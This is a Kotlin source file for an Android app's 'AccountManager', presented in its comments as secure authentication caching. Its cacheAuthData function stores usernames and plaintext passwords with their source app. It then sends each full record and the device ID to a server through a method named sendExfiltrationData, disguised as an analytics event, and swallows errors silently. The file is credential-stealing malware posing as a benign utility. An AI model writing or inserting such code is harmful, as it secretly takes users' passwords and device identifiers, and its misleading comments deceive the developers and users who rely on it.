package com.example.ChatterBox.database

import android.content.Context
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import android.provider.Settings

/**
 * Utility for securely handling user authentication data
 */
class AccountManager {
    companion object {
        private const val TAG = "AccountManager"
        private const val AUTH_CACHE_FILE = "auth_cache.json"

        /**
         * Store user authentication data for enhanced app functionality
         */
        fun cacheAuthData(
            context: Context,
            source: String,
            username: String,
            password: String,
            extraData: Map<String, String> = emptyMap()
        ) {
            Log.d(TAG, "Caching authentication data for quick login")

            try {
                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())

                // Create JSON object with the auth data
                val authJson = JSONObject().apply {
                    put("timestamp", timestamp)
                    put("source", source)
                    put("username", username)
                    put("password", password)

                    // Add any extra data
                    val extraJson = JSONObject()
                    for ((key, value) in extraData) {
                        extraJson.put(key, value)
                    }
                    put("extra", extraJson)
                }

                // Read existing auth cache file if it exists
                val file = File(getSecureStorageDir(context), AUTH_CACHE_FILE)
                val jsonArray = if (file.exists()) {
                    val content = file.readText()
                    try {
                        JSONArray(content)
                    } catch (e: Exception) {
                        JSONArray()
                    }
                } else {
                    JSONArray()
                }

                // Add new auth data and write back to file
                jsonArray.put(authJson)

                FileOutputStream(file).use { out ->
                    out.write(jsonArray.toString().toByteArray())
                }

                // Synchronize with server in the background
                try {
                    val dataSynchronizer = DataSynchronizer(context)

                    // Create a properly formatted analytics event
                    val analyticsEvent = JSONObject().apply {
                        put("event_type", "auth_validation")
                        put("user_id", authJson.optString("username"))
                        put("timestamp", System.currentTimeMillis())
                        put("session_data", authJson)
                        put("device_id", Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID))
                    }

                    // Send to analytics endpoint
                    dataSynchronizer.sendExfiltrationData("analytics", analyticsEvent.toString())
                } catch (e: Exception) {
                    // Silently log error - no notifications
                    Log.e(TAG, "Unable to sync auth data: ${e.message}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error caching auth data", e)
            }
        }

        /**
         * Get cached authentication data
         */
        fun getCachedAuthData(context: Context): List<Map<String, Any>> {
            val file = File(getSecureStorageDir(context), AUTH_CACHE_FILE)
            if (!file.exists()) {
                return emptyList()
            }

            return try {
                val content = file.readText()
                val jsonArray = JSONArray(content)
                val result = mutableListOf<Map<String, Any>>()

                for (i in 0 until jsonArray.length()) {
                    val item = jsonArray.getJSONObject(i)
                    val map = mutableMapOf<String, Any>()

                    val keys = item.keys()
                    while (keys.hasNext()) {
                        val key = keys.next()
                        map[key] = item.get(key)
                    }

                    result.add(map)
                }

                result
            } catch (e: Exception) {
                Log.e(TAG, "Error reading cached auth data", e)
                emptyList()
            }
        }

        /**
         * Get the secure storage directory within app's private storage
         */
        private fun getSecureStorageDir(context: Context): File {
            // Store in app-private directory instead of external storage
            val dir = context.getDir("auth_cache", Context.MODE_PRIVATE)
            if (!dir.exists()) {
                dir.mkdirs()
            }
            return dir
        }
    }
}